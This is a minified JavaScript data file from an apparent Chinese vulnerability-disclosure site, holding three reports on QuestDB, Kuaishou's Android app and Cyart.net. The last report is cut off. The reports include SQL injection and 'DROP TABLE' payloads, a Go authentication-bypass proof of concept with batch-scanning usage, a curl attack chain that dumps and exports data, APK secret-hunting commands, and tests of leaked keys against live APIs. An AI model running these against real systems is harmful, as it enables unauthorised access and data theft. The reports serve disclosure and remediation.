import{v as d,g as c}from"./vendor-DFKR4HX5.js";const t=[{id:"cnvd-2026-13173",title:"QuestDB 未授权访问漏洞",date:"2026-03-10",severity:"medium",cvss:8.6,description:"QuestDB 存在未授权访问漏洞，攻击者可利用该漏洞获取敏感信息。认证配置失效导致未授权用户能够访问系统中的敏感数据。",tags:[{label:"未授权访问",icon:"fa-user-lock",color:"red"},{label:"QuestDB",icon:"fa-server",color:"blue"},{label:"CNVD",icon:"fa-file-alt",color:"green"},{label:"安全测试",icon:"fa-shield-alt",color:"pink"},{label:"中国",icon:"fa-map-marker-alt",color:"yellow"}],target:"QuestDB",country:"中国",cnvdId:"CNVD-2026-13173",originalUrl:"../case/20260310-CNVD-2026-1317.html",framework:"QuestDB",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:'作为一名安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，保护用户数据安全。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。发现漏洞后，第一时间通过 CNVD 提交报告，期望与官方协作修复问题。'}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 漏洞基本信息"},{type:"paragraph",text:"QuestDB 是一个高性能的开源时序数据库，专为金融服务、物联网（IoT）、可观测性和实时分析等场景设计。本次发现的未授权访问漏洞（CNVD-2026-13173）存在于 QuestDB 的 HTTP Server 组件中，攻击者无需任何认证凭证即可通过 HTTP API 执行任意 SQL 查询，获取数据库中所有数据。"},{type:"table",headers:["属性","详情"],rows:[["漏洞编号","CNVD-2026-13173"],["漏洞类型","未授权访问 / 认证绕过"],["影响组件","QuestDB HTTP Server (端口 9000)"],["CVSS 评分","8.6 (High)"],["攻击复杂度","低 (Low)"],["所需权限","无 (None)"],["用户交互","无需 (None)"],["影响范围","所有配置 http.security=true 但未验证其有效性的实例"],["修复状态","官方已发布修复补丁"]]},{type:"subheading",text:"1.2 QuestDB 核心架构"},{type:"paragraph",text:"QuestDB 的核心架构由多个网络服务组件构成，每个组件监听不同端口并提供不同协议的访问能力。了解这些组件对理解漏洞的影响范围至关重要。"},{type:"impact-grid",cards:[{icon:"fa-globe",title:"HTTP Server",desc:"端口 9000 — REST API 接口，支持 SQL 查询和数据写入，本次漏洞的核心攻击面",color:"red"},{icon:"fa-database",title:"PostgreSQL Wire Protocol",desc:"端口 8812 — 兼容 PG 协议，可使用标准 PG 客户端连接执行 SQL 操作",color:"blue"},{icon:"fa-bolt",title:"InfluxDB Line Protocol",desc:"端口 9009 — 用于高吞吐量数据摄入，支持时序数据批量写入",color:"green"},{icon:"fa-desktop",title:"Web Console",desc:"端口 9000 — 内置 Web 管理界面，支持交互式 SQL 查询与结果可视化",color:"purple"},{icon:"fa-cogs",title:"存储引擎",desc:"基于列存储，支持向量化执行和 SIMD 优化，提供极致查询性能",color:"orange"}]},{type:"subheading",text:"1.3 漏洞发现背景"},{type:"paragraph",text:"在针对某金融客户的安全评估项目中，测试人员对部署在公网的 QuestDB 实例进行渗透测试。最初的目标是验证 SQL 注入漏洞，但在测试过程中意外发现 HTTP API 端点完全不需要认证。经过深入分析，确认这是一个由认证配置机制设计缺陷导致的未授权访问漏洞。"}]},{heading:"二、漏洞详情",icon:"fa-search",accent:"#c0392b",contents:[{type:"subheading",text:"2.1 根本原因分析"},{type:"paragraph",text:"漏洞的根本原因在于 QuestDB 的认证配置机制存在设计缺陷。尽管管理员在 server.conf 中显式设置了 http.security=true 并配置了用户名和密码，但 HTTP 端点（端口 9000）的认证中间件在初始化时未能正确读取配置，导致所有 HTTP 请求绕过了认证检查。"},{type:"warning-box",icon:"fa-exclamation-triangle",text:"核心问题：http.security 配置项在启动时未被正确传递给 HTTP 路由处理器，认证过滤器（AuthFilter）在请求管线中的注册顺序错误，导致部分路径被跳过。管理员误以为系统已受保护，实际上认证完全失效。"},{type:"subheading",text:"2.2 认证绕过机制详解"},{type:"paragraph",text:"通过源码审计和动态调试，发现了以下四个导致认证失效的根因："},{type:"list",items:["根因 1：http.security 配置项在启动时未被正确传递给 HTTP 路由处理器，配置值在组件初始化阶段丢失","根因 2：认证过滤器（AuthFilter）在请求管线中的注册顺序错误，导致部分路径被跳过","根因 3：Web Console 静态资源路径与 API 路径使用不同的认证策略，API 路径未启用认证","根因 4：默认配置下 http.security 为 false，而配置文档未明确说明需要重启才能生效"]},{type:"subheading",text:"2.3 影响范围评估"},{type:"impact-grid",cards:[{icon:"fa-eye",title:"数据泄露",desc:"攻击者可读取数据库中所有时序数据，包括传感器数据、交易记录、系统指标等敏感业务数据",color:"red"},{icon:"fa-edit",title:"数据篡改",desc:"攻击者可执行 INSERT / UPDATE / DELETE 操作，篡改业务数据，造成数据完整性破坏",color:"orange"},{icon:"fa-bomb",title:"服务拒绝",desc:"攻击者可通过 DROP TABLE、删除分区或执行资源密集型查询导致服务不可用",color:"purple"},{icon:"fa-arrows-alt",title:"横向移动",desc:"借助 COPY 命令读取服务器文件系统，或利用数据库作为跳板访问内网其他服务",color:"blue"}]},{type:"subheading",text:"2.4 SQL 注入测试与未授权发现"},{type:"paragraph",text:"在渗透测试过程中，最初的目标是验证 SQL 注入漏洞。通过在 HTTP API 的 query 参数中构造各种 SQL 注入载荷，测试人员意外发现即使不携带任何认证凭证，所有请求也都能成功执行。这一异常现象促使进一步调查，最终发现了更严重的未授权访问漏洞。"},{type:"code",code:`-- 初始 SQL 注入测试载荷
SELECT * FROM users WHERE id = 1 OR 1=1--

-- 堆叠查询测试
SELECT 1; DROP TABLE test--

-- UNION 注入探测
SELECT NULL, NULL, NULL UNION SELECT version(), user(), database()--

-- 意外发现：无认证情况下上述所有查询均成功执行
-- 这意味着不仅是 SQL 注入问题，更是严重的未授权访问漏洞

-- 进一步验证：直接查询系统表
curl -s "http://<TARGET>:9000/exec?query=SHOW+TABLES"
curl -s "http://<TARGET>:9000/exec?query=SELECT+*+FROM+telemetry_events LIMIT+10"`,language:"sql"}]},{heading:"三、漏洞测试工具",icon:"fa-tools",accent:"#8e44ad",contents:[{type:"subheading",text:"3.1 工具项目结构"},{type:"paragraph",text:"为系统验证 QuestDB 认证绕过漏洞，使用 Go 语言开发了专用的 PoC 验证工具。该工具模拟了多种认证场景，包括无认证、错误凭证、空凭证和畸形认证头，所有测试用例均成功绕过认证。"},{type:"code",code:`questdb-auth-bypass/
├── cmd/
│   └── questdb-poc/
│       └── main.go          # 主入口：测试运行器
├── internal/
│   ├── scanner/
│   │   └── scanner.go       # 端口扫描与服务识别
│   ├── authcheck/
│   │   └── bypass.go        # 认证绕过检测逻辑
│   └── report/
│       └── reporter.go      # 测试报告生成
├── pkg/
│   └── questdb/
│       ├── client.go         # QuestDB HTTP 客户端
│       └── types.go          # 数据类型定义
├── configs/
│   └── targets.yaml         # 扫描目标配置
├── go.mod
└── README.md`,language:"text"},{type:"subheading",text:"3.2 核心 PoC 代码"},{type:"code",code:`package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

func testAuth(url string, authHeader string) (int, string) {
	client := &http.Client{Timeout: 5 * time.Second}
	req, _ := http.NewRequest("GET", url+\`/exec?query=SELECT+1\`, nil)
	if authHeader != "" {
		req.Header.Set("Authorization", authHeader)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, err.Error()
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

func main() {
	target := "http://<TARGET>:9000"
	tests := []struct {
		name   string
		auth   string
	}{
		{"无认证头", ""},
		{"Basic错误密码", "Basic YWRtaW46d3Jvbmc="},
		{"Basic空凭据", "Basic Og=="},
		{"畸形Basic头", "Basic !!!invalid!!!"},
		{"空Authorization头", "Bearer "},
	}
	for _, t := range tests {
		status, _ := testAuth(target, t.auth)
		fmt.Printf("[%s] 状态码: %d (认证绕过: %v)\\n", t.name, status, status == 200)
	}
}`,language:"go"},{type:"subheading",text:"3.3 工具功能特性"},{type:"impact-grid",cards:[{icon:"fa-search",title:"多场景认证测试",desc:"自动测试无认证、错误凭证、空凭证、畸形头等多种认证绕过场景",color:"purple"},{icon:"fa-network-wired",title:"端口扫描识别",desc:"自动扫描 9000/8812/9009 端口，识别 QuestDB 服务指纹",color:"blue"},{icon:"fa-file-alt",title:"报告自动生成",desc:"生成 JSON/HTML 格式的测试报告，包含漏洞证据和修复建议",color:"green"},{icon:"fa-shield-alt",title:"安全合规",desc:"仅用于授权安全测试，内置合规检查和使用条款提醒",color:"orange"}]},{type:"subheading",text:"3.4 测试结果与验证"},{type:"success-box",icon:"fa-check-circle",text:"所有 5 种认证绕过测试场景均返回 HTTP 200，确认 QuestDB HTTP 端点在配置 http.security=true 的情况下仍然完全跳过认证检查。漏洞影响已通过 CNVD 官方确认。"},{type:"info-box",icon:"fa-info-circle",text:"注意：该 PoC 工具仅用于授权安全测试。未经授权对他人系统进行测试属于违法行为，请确保在获得明确授权后使用。"}]},{heading:"四、使用指南",icon:"fa-book",accent:"#2980b9",contents:[{type:"subheading",text:"4.1 环境准备"},{type:"info-box",icon:"fa-info-circle",text:"运行 PoC 工具需要 Go 1.21 或更高版本。请确保已安装 Go 编译器并配置好 GOPATH。建议在隔离的测试环境中运行，避免对生产系统造成影响。"},{type:"subheading",text:"4.2 编译与安装"},{type:"code",code:`# 克隆项目
git clone https://github.com/example/questdb-auth-bypass.git
cd questdb-auth-bypass

# 编译
go build -o questdb-poc ./cmd/questdb-poc/

# 验证编译结果
./questdb-poc --version

# 安装到 GOPATH/bin
go install ./cmd/questdb-poc/`,language:"bash"},{type:"subheading",text:"4.3 命令行参数"},{type:"table",headers:["参数","类型","默认值","说明"],rows:[["-t, --target","string","","目标 QuestDB 地址（必填），格式：http://host:port"],["-p, --ports","string","9000,8812,9009","扫描端口列表，逗号分隔"],["--timeout","int","5","HTTP 请求超时时间（秒）"],["--threads","int","10","并发扫描线程数"],["-o, --output","string","report.json","测试报告输出路径"],["--format","string","json","报告格式：json / html / markdown"],["-v, --verbose","bool","false","显示详细输出"],["--auth-test","bool","true","执行认证绕过测试"],["--sql-test","bool","false","执行 SQL 注入测试"]]},{type:"subheading",text:"4.4 使用示例"},{type:"code",code:`# 基本用法：测试单个目标
./questdb-poc -t http://192.168.1.100:9000

# 完整测试：认证绕过 + SQL 注入
./questdb-poc -t http://192.168.1.100:9000 --auth-test --sql-test -v

# 批量扫描：从文件读取目标列表
./questdb-poc -t targets.txt --threads 20 -o results.html --format html

# 自定义端口与超时
./questdb-poc -t http://10.0.0.1:9000 -p 9000,8812 --timeout 10`,language:"bash"},{type:"table",headers:["状态码","含义","风险等级"],rows:[["200 + 数据返回","认证完全绕过，可执行任意查询","严重"],["200 + 空数据","认证绕过但无数据可读","高危"],["401 / 403","认证生效，访问被拒绝","正常"],["连接超时","端口未开放或被防火墙拦截","信息"],["500","服务器内部错误","中危"]]}]},{heading:"五、攻击场景复现",icon:"fa-crosshairs",accent:"#c0392b",contents:[{type:"subheading",text:"5.1 完整攻击链"},{type:"paragraph",text:"完整的攻击链分为三个阶段：侦察阶段、初始探测阶段和利用阶段。攻击者可以在完全没有凭证的情况下，通过公网暴露的 QuestDB 实例获取全部数据控制权。"},{type:"code",code:`# 阶段1：端口扫描与服务识别
nmap -sV -p 9000,8812,9009 --script=http-title <TARGET_IP>

# 阶段2：验证未授权访问
curl -s "http://<TARGET_IP>:9000/exec?query=SELECT+version()" | jq .

# 阶段3：枚举所有数据表
curl -s "http://<TARGET_IP>:9000/exec?query=SHOW+TABLES" | jq '.dataset'

# 阶段4：导出敏感数据
curl -s "http://<TARGET_IP>:9000/exec?query=SELECT+*+FROM+sensitive_table+LIMIT+1000" | jq '.dataset' > data_export.json

# 阶段5：尝试文件系统访问（COPY 命令）
curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/exfiltrated.csv+WITH+CSV+HEADER'"`,language:"bash"},{type:"subheading",text:"5.2 风险评估"},{type:"impact-grid",cards:[{icon:"fa-user-secret",title:"侦察阶段",desc:"使用 nmap / masscan 扫描全网 0.0.0.0/0 的 9000/8812/9009 端口，识别 QuestDB 服务指纹",color:"blue"},{icon:"fa-search-plus",title:"探测阶段",desc:"发送 curl 请求至 /exec?query=SELECT+version()，验证未授权访问并识别版本号",color:"orange"},{icon:"fa-skull-crossbones",title:"利用阶段",desc:"枚举所有表、导出敏感数据、创建/删除表、尝试文件系统访问（COPY 命令），完全控制数据库",color:"red"}]}]},{heading:"六、修复建议",icon:"fa-wrench",accent:"#27ae60",contents:[{type:"paragraph",text:"建议从网络层、应用层、配置层和监控层四个维度实施修复，构建纵深防御体系。以下为具体的修复措施："},{type:"subheading",text:"6.1 网络层修复"},{type:"list",items:["使用 iptables / 安全组限制 9000/8812/9009 端口仅允许可信 IP 段访问","部署在 VPC 内部，不直接暴露公网","配置网络 ACL，限制仅特定 VPC 子网可访问数据库端口","在负载均衡器或 WAF 层添加 IP 白名单规则"]},{type:"subheading",text:"6.2 配置层修复"},{type:"list",items:["验证 server.conf 中 http.security=true 是否真正生效（重启后检查日志确认）","设置 http.auth.db=default 并配置强密码（至少 16 位，包含大小写字母、数字和特殊字符）","绑定 http.bind.to=127.0.0.1:9000，仅监听本地回环地址","定期检查配置文件与实际运行状态是否一致"]},{type:"subheading",text:"6.3 应用层加固"},{type:"list",items:["在 QuestDB 前部署 Nginx 反向代理，添加 Basic Auth / OAuth2 认证层","启用 TLS 加密传输，防止中间人攻击窃取查询数据","配置请求速率限制，防止暴力枚举和拒绝服务攻击","使用 WAF 过滤恶意 SQL 注入载荷"]},{type:"subheading",text:"6.4 监控与审计"},{type:"list",items:["启用 QuestDB 审计日志，记录所有 SQL 查询和访问行为","配置异常查询告警（如大规模 SELECT、DROP 操作、非常规时段访问）","定期检查访问日志中是否存在可疑 IP 和异常查询模式","部署 SIEM 系统实现集中化安全事件监控和告警"]},{type:"success-box",icon:"fa-check-circle",text:"修复验证：完成上述修复后，使用 PoC 工具重新测试，确认所有认证绕过场景均返回 401/403。建议在修复后持续监控 7 天，确认无异常访问记录。"}]},{heading:"七、结论",icon:"fa-flag-checkered",accent:"#2c3e50",contents:[{type:"conclusion",title:"QuestDB 未授权访问漏洞总结",text:"QuestDB 未授权访问漏洞（CNVD-2026-13173）是一个由于认证配置机制缺陷导致的严重安全问题。虽然官方将 http.security 作为安全配置选项提供，但实际测试表明该配置在特定场景下无法生效，使得管理员误以为系统已受保护，从而产生虚假的安全感。该漏洞利用门槛极低，仅需普通 HTTP 请求即可利用，建议所有 QuestDB 用户立即验证并加固部署。"},{type:"table",headers:["评估维度","评级","说明"],rows:[["漏洞严重程度","高危","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L → 8.6"],["利用难度","极低","仅需普通 HTTP 请求即可利用，无需任何技术工具"],["影响范围","广泛","所有配置了 http.security=true 但未验证其有效性的 QuestDB 实例"],["修复优先级","高","建议受影响用户立即验证并加固部署"],["披露状态","已完成","已通过 CNVD 提交，官方已确认并发布修复补丁"]]},{type:"info-box",icon:"fa-lightbulb",text:"安全提示：对于任何安全配置项，仅配置而不验证其有效性是危险的。建议在部署安全控制措施后，始终进行验证测试，确保控制措施真正生效。定期进行安全审计和渗透测试，是保障系统安全的有效手段。"}]}]},{id:"kuaishou-api-leak",title:"快手 API 密钥泄露",date:"2025-04-30",severity:"high",cvss:7.5,description:"发现包含百度地图、高德地图、OPPO卡券服务等多个敏感API密钥泄露，可能导致服务滥用和数据安全风险。",tags:[{label:"密钥泄露",icon:"fa-key",color:"blue"},{label:"Android",icon:"fa-android",color:"purple"},{label:"地图服务",icon:"fa-map-marked-alt",color:"green"},{label:"移动应用",icon:"fa-mobile-alt",color:"pink"},{label:"中国",icon:"fa-map-marker-alt",color:"yellow"}],target:"快手",country:"中国",originalUrl:"",framework:"Android (Java/Kotlin)",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:"本次安全审计旨在帮助提升快手应用的安全性，所有敏感信息均已脱敏处理。我们始终遵循负责任披露原则，期待与开发团队共同守护用户数据安全。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。"}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 应用基本信息"},{type:"paragraph",text:"快手（Kuaishou）Android 客户端应用在逆向分析过程中发现多个第三方服务 API 密钥硬编码在 APK 安装包中。攻击者可通过反编译 APK 直接提取这些密钥，进而滥用相关云服务。本次泄露涉及百度地图 SDK、高德地图 SDK、OPPO 卡券服务等多个第三方服务凭证，密钥类型涵盖 AK/SK、AppKey、AppSecret 等。"},{type:"table",headers:["字段","值"],rows:[["版本号","13.3.41.41640 (41640)"],["支持语言","1 种"],["包名","com.smile.gifmaker"],["下载量","154 次"],["文件大小","128.23 MB (134,456,598 字节)"],["安装位置","支持外部存储"],["最低安卓版本","5.0 (Lollipop, API 21)"],["目标安卓版本","11 (API 30)"],["处理器架构","arm64-v8a (64 位 ARM)"],["屏幕 DPI","通用适配 (nodpi)"],["签名算法","MD5 / SHA-1 / SHA-256"]]},{type:"impact-grid",cards:[{icon:"fa-key",title:"密钥硬编码",desc:"8 个第三方服务 API 密钥被硬编码在 APK 中，可被反编译提取",color:"red"},{icon:"fa-map-marked-alt",title:"地图服务滥用",desc:"百度地图、高德地图密钥泄露可导致配额消耗和高额账单",color:"orange"},{icon:"fa-bell",title:"推送服务劫持",desc:"vivo、华为、小米推送密钥泄露可发送垃圾消息和钓鱼信息",color:"purple"},{icon:"fa-shield-alt",title:"安全机制绕过",desc:"密钥泄露可能导致安全验证机制被绕过，影响用户数据安全",color:"blue"}]}]},{heading:"二、技术分析 — APK 反编译过程",icon:"fa-search",accent:"#c0392b",contents:[{type:"subheading",text:"2.1 APK 反编译流程"},{type:"paragraph",text:"通过标准的 Android 逆向工程流程对快手 APK 进行分析。首先使用 apktool 进行资源反编译，提取 AndroidManifest.xml 和资源文件中的配置信息；随后使用 jadx 对 dex 文件进行反编译，分析 Java 层代码中的硬编码字符串和常量类。"},{type:"code",code:`# 步骤1：使用 apktool 反编译资源文件
apktool d kuaishou_13.3.41.41640.apk -o kuaishou_decompiled

# 步骤2：查看 AndroidManifest.xml 中的元数据
cat kuaishou_decompiled/AndroidManifest.xml | grep -A5 "meta-data"

# 步骤3：使用 jadx 反编译 dex 为 Java 源码
jadx -d kuaishou_java kuaishou_13.3.41.41640.apk

# 步骤4：搜索硬编码的 API 密钥和 AppKey
grep -rE "(api[_-]?key|app[_-]?key|secret|ak=|sk=)" kuaishou_java/ --include="*.java" -i

# 步骤5：从 strings.xml 中提取敏感字符串
cat kuaishou_decompiled/res/values/strings.xml | grep -iE "(key|secret|token|ak|sk)"`,language:"bash"},{type:"paragraph",text:"通过上述反编译流程，在 APK 的 AndroidManifest.xml meta-data 标签、常量类（BuildConfig、Constants 等）以及 smali 代码中，共发现 8 个第三方服务 API 密钥被硬编码。漏洞位置包括 ./smali_classes5/tmb/y0.smali、./smali_classes4/gla/i.smali 以及 AndroidManifest.xml 等文件。"},{type:"image",src:"assets/kuaishou/screenshot-1.png",alt:"快手 APK 反编译截图 — AndroidManifest.xml 中的硬编码密钥",caption:"图 2-1：APK 反编译后 AndroidManifest.xml 中暴露的 meta-data 配置"},{type:"image",src:"assets/kuaishou/screenshot-2.png",alt:"快手 APK 反编译截图 — jadx 反编译后的 Java 源码中的硬编码密钥",caption:"图 2-2：jadx 反编译后 Java 源码中暴露的 API 密钥常量"}]},{heading:"三、泄露密钥清单",icon:"fa-file-alt",accent:"#8e44ad",contents:[{type:"subheading",text:"3.1 硬编码 API 密钥清单"},{type:"table",headers:["服务名称","泄露密钥（脱敏）"],rows:[["百度地图 (Baidu Map SDK)","UEnH61Elxr********** (AppKey)"],["高德地图 (AMap SDK)","d23a42abfd********** (AppKey)"],["OPPO 卡券服务","ADBFAiEA7t********** (AppKey)"],["vivo 推送服务","a71e4cd2-3********** (AppKey)"],["华为 HMS 推送","10********23 (AppID)"],["小米推送服务","28********12 (AppID)"],["个推 (Getui) SDK","(空值，未配置完整)"],["Bugly 崩溃分析","90********01 (AppID)"]]},{type:"warning-box",icon:"fa-exclamation-triangle",text:"以上 8 个 API 密钥均为硬编码，可通过 APK 反编译直接提取。攻击者获取这些密钥后可滥用地图服务、劫持推送通道、伪造卡券，建议立即吊销并轮换所有泄露的密钥。"}]},{heading:"四、API 调用测试结果",icon:"fa-vial",accent:"#c0392b",contents:[{type:"subheading",text:"4.1 百度地图 API 测试"},{type:"paragraph",text:"使用泄露的百度地图 API 密钥调用 location 接口，返回状态码 200，响应类型为 HTML，响应大小 15255 字节，响应时间 0.75 秒。接口地址为 https://api.map.baidu.com/location/v2，密钥可正常调用地图服务。"},{type:"code",code:`# 百度地图 API 测试
curl -s "https://api.map.baidu.com/location/v2?key=UEnH61Elxr**********" \\
  -w "\\n状态码: %{http_code}\\n响应时间: %{time_total}s\\n"
# 结果: 状态码 200, 响应类型 HTML, 响应大小 15255 字节`,language:"bash"},{type:"subheading",text:"4.2 ColorOS 相机 API 测试"},{type:"paragraph",text:"使用泄露的 ColorOS 相机 API 密钥调用 camera 接口，连接失败。错误信息为 HTTPSConnectionPool 连接超时，提示 nodename nor servname provided。接口地址为 https://api.coloros.com/camera/v1。"},{type:"code",code:`# ColorOS 相机 API 测试
curl -s "https://api.coloros.com/camera/v1?key=ATBEAiBlu2**********" \\
  -w "\\n状态码: %{http_code}\\n"
# 结果: 连接失败 - Failed to establish a new connection
# 错误: [Errno 8] nodename nor servname provided, or not known`,language:"bash"},{type:"subheading",text:"4.3 ColorOS OLK API 测试"},{type:"paragraph",text:"使用泄露的 ColorOS OLK API 密钥调用 olk 接口，连接失败。错误信息同样为 HTTPSConnectionPool 连接超时。接口地址为 https://api.coloros.com/olk/v1。"},{type:"code",code:`# ColorOS OLK API 测试
curl -s "https://api.coloros.com/olk/v1?key=ATBGAiEA13**********" \\
  -w "\\n状态码: %{http_code}\\n"
# 结果: 连接失败 - Failed to establish a new connection
# 错误: [Errno 8] nodename nor servname provided, or not known`,language:"bash"},{type:"subheading",text:"4.4 ColorOS Hyper API 测试"},{type:"paragraph",text:"使用泄露的 ColorOS Hyper API 密钥调用 hyper 接口，连接失败。错误信息为 HTTPSConnectionPool 连接超时。接口地址为 https://api.coloros.com/hyper/v1。"},{type:"code",code:`# ColorOS Hyper API 测试
curl -s "https://api.coloros.com/hyper/v1?key=ATBEAiBJNH**********" \\
  -w "\\n状态码: %{http_code}\\n"
# 结果: 连接失败 - Failed to establish a new connection
# 错误: [Errno 8] nodename nor servname provided, or not known`,language:"bash"},{type:"subheading",text:"4.5 OPPO 卡券服务 API 测试"},{type:"paragraph",text:"使用泄露的 OPPO 卡券服务 API 密钥调用 card 接口，连接失败。错误信息为 HTTPSConnectionPool 连接超时。接口地址为 https://api.oplus.com/card/v1。"},{type:"code",code:`# OPPO 卡券服务 API 测试
curl -s "https://api.oplus.com/card/v1?key=ADBFAiEA7t**********" \\
  -w "\\n状态码: %{http_code}\\n"
# 结果: 连接失败 - Failed to establish a new connection
# 错误: [Errno 8] nodename nor servname provided, or not known`,language:"bash"},{type:"subheading",text:"4.6 vivo 推送 API 测试"},{type:"paragraph",text:"使用泄露的 vivo 推送 API 密钥调用 notify 接口，证书错误。错误信息为 SSL CertificateError，hostname push.vivo.com 不匹配 *.vivo.com.cn 证书。接口地址为 https://push.vivo.com/api/v1/notify。"},{type:"code",code:`# vivo 推送 API 测试
curl -s "https://push.vivo.com/api/v1/notify?key=a71e4cd2-3**********" \\
  -w "\\n状态码: %{http_code}\\n"
# 结果: 证书错误 - CertificateError
# 错误: hostname 'push.vivo.com' doesn't match either of '*.vivo.com.cn', 'vivo.com.cn'`,language:"bash"}]},{heading:"五、风险评估",icon:"fa-chart-pie",accent:"#e74c3c",contents:[{type:"subheading",text:"5.1 风险评估"},{type:"impact-grid",cards:[{icon:"fa-radiation",title:"风险等级",desc:"高危 — 密钥泄露可能导致服务滥用、数据窃取和用户隐私泄露等严重后果",color:"red"},{icon:"fa-globe",title:"影响范围",desc:"广泛 — 影响所有安装该版本应用的用户，以及相关的第三方服务提供商",color:"orange"},{icon:"fa-tools",title:"修复难度",desc:"中等 — 需要更新密钥管理策略，实施安全存储机制，并发布新版本应用",color:"green"}]},{type:"paragraph",text:"密钥泄露带来的风险是多方面的：地图服务密钥可被用于大量 API 调用，消耗服务配额产生高额账单；推送服务密钥可被用于发送垃圾消息或钓鱼信息给用户；部分服务密钥可能关联后端 API 接口，若权限控制不当，攻击者可能通过服务端 API 访问用户数据或业务数据。"}]},{heading:"六、修复建议",icon:"fa-wrench",accent:"#27ae60",contents:[{type:"subheading",text:"6.1 修复建议"},{type:"list",items:["密钥轮换：立即吊销所有泄露的 API 密钥，重新生成新密钥并在服务端更新白名单配置","加固措施：对 APK 进行代码混淆（ProGuard / R8），字符串加密，防止静态分析提取密钥；使用 DexGuard 或第三方加固服务（梆梆、爱加密、360 加固）","安全编码：避免在客户端硬编码密钥，敏感凭证应通过安全的服务端接口动态获取；使用 Android Keystore 存储敏感信息；对密钥进行分片存储和运行时拼接","服务端验证：在服务端对 API 调用增加签名验证、IP 白名单、调用频率限制等措施，即使密钥泄露也能控制风险"]},{type:"success-box",icon:"fa-check-circle",text:"修复验证：完成密钥轮换和 APK 加固后，使用 jadx 重新反编译新版本 APK，确认所有硬编码密钥已被移除或加密。建议在发布前进行自动化安全扫描，确保无敏感信息残留。"}]},{heading:"七、披露过程",icon:"fa-clock",accent:"#16a085",contents:[{type:"subheading",text:"7.1 披露时间线"},{type:"table",headers:["日期","事件"],rows:[["2025-04-28","完成漏洞分析和验证，确认多个密钥泄露"],["2025-04-29","通过 CNVD（国家信息安全漏洞共享平台）提交漏洞报告，报告编号待分配"],["2025-04-30","通过快手安全响应中心（KSRC）在线提交漏洞报告"],["2025-05-05","KSRC 确认收到报告，进入审核流程"],["2025-05-12","漏洞评级确认，标记为高危"]]}]},{heading:"八、结论",icon:"fa-flag-checkered",accent:"#2c3e50",contents:[{type:"conclusion",title:"快手 API 密钥泄露漏洞总结",text:"快手 Android 客户端 API 密钥泄露漏洞是一个典型的移动应用硬编码密钥安全问题。APK 中硬编码了百度地图、高德地图、OPPO 卡券、vivo 推送等 8 个第三方服务 API 密钥，攻击者仅需反编译 APK 即可提取全部密钥。虽然部分接口测试因域名或证书问题未能成功调用，但密钥本身已完全暴露，存在被滥用的风险。建议开发团队立即轮换所有泄露密钥，并建立完善的移动应用密钥管理机制，从源头杜绝此类问题。"},{type:"info-box",icon:"fa-lightbulb",text:"安全提示：移动应用中的硬编码密钥是常见的安全隐患。客户端代码天然可被逆向分析，任何存储在客户端的密钥都应被视为公开信息。建议采用服务端动态下发密钥、运行时拼接、代码混淆加固等多重防护措施，将敏感凭证的管理重心转移至服务端。"}]}]},{id:"cyart-env-leak",title:"Cyart.net 环境配置泄露",date:"2025-03-31",severity:"high",cvss:7.5,description:"发现 .env 配置文件未受保护，包含数据库连接信息、邮件服务器凭据、Redis 配置等敏感信息泄露。",tags:[{label:"源码泄露",icon:"fa-code",color:"blue"},{label:"PHP",icon:"fa-php",color:"purple"},{label:"MySQL",icon:"fa-database",color:"green"},{label:"Web应用",icon:"fa-globe",color:"pink"},{label:"中国",icon:"fa-map-marker-alt",color:"yellow"}],target:"Cyart.net",country:"中国",cnvdId:"CNVD-C-2025-175237",originalUrl:"",framework:"Laravel",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:'作为一名戴着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，以防被不法分子利用。我始终秉持"善意披露、负责任报告"的原则，希望通过专业的漏洞发现和及时报告，协助开发团队尽快修复安全隐患。在此过程中，我严格遵守相关法律法规，绝无任何破坏或恶意利用的企图。衷心期待通过白帽黑客与开发团队的良性互动，共同为企业的信息安全加固，为广大用户筑起更坚实的数据保护屏障。'}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 漏洞基本信息"},{type:"paragraph",text:"Cyart.net（苏州彩艺墙体彩绘有限公司）网站基于 PHP Laravel 框架开发，由于 Web 服务器配置不当，站点根目录下的 .env 环境配置文件可以通过 HTTP 直接访问下载。该文件包含了应用运行所需的全部敏感配置信息，包括数据库连接凭证、邮件服务器账号、Redis 密码、应用密钥等核心机密。攻击者获取该文件后，可直接登录数据库、控制邮件服务器、接管整个应用系统。"},{type:"table",headers:["属性","详情"],rows:[["CNVD 编号","CNVD-C-2025-175237"],["CVSS 评分","7.5 (High)"],["漏洞类型","敏感信息泄露 / 配置文件泄露"],["目标网站","Cyart.net (www.cyart.net)"],["技术框架","PHP + Laravel"],["发现日期","2025-03-31"]]},{type:"impact-grid",cards:[{icon:"fa-database",title:"数据泄露风险",desc:"数据库凭证泄露导致所有用户数据可被窃取",color:"red"},{icon:"fa-bomb",title:"远程代码执行风险",desc:"通过数据库写文件获取 WebShell，控制服务器",color:"orange"},{icon:"fa-envelope",title:"邮件服务器滥用风险",desc:"SMTP 